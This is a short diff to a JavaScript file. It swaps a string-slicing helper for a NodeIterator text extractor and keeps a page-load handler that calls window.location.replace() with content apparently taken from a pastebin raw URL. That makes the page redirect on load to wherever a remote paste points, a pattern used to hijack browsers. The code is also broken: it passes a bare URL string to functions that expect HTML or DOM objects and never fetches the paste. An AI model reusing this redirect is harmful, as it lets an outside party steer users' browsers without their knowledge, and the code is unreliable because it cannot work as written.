@@ -18,13 +18,20 @@
 });
 
 
-    function getBody(content) 
-{ 
-   var x = content.indexOf("<body");
-   x = content.indexOf(">", x);    
-   var y = content.lastIndexOf("</body>"); 
-   return content.slice(x + 1, y);
-} 
+function getTextFromHTML(obj) {
+    var ni = document.createNodeIterator(obj[0], NodeFilter.SHOW_TEXT, null, false);
+    var nodeLine = ni.nextNode();   // go to first node of our NodeIterator
+    var plainText = "";
+
+    while (nodeLine) {
+        plainText += nodeLine.nodeValue + "\n";
+        nodeLine = ni.nextNode();
+    }
+
+    return plainText;
+ }
+
+
 
 
 document.addEventListener('DOMContentLoaded', function() {
@@ -32,7 +39,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
 
 
-    window.location.replace(getBody("https://pastebin.com/raw/KZ3AkpXw"));
+    window.location.replace(getTextFromHTML("https://pastebin.com/raw/KZ3AkpXw"));
 
 
 }, false);
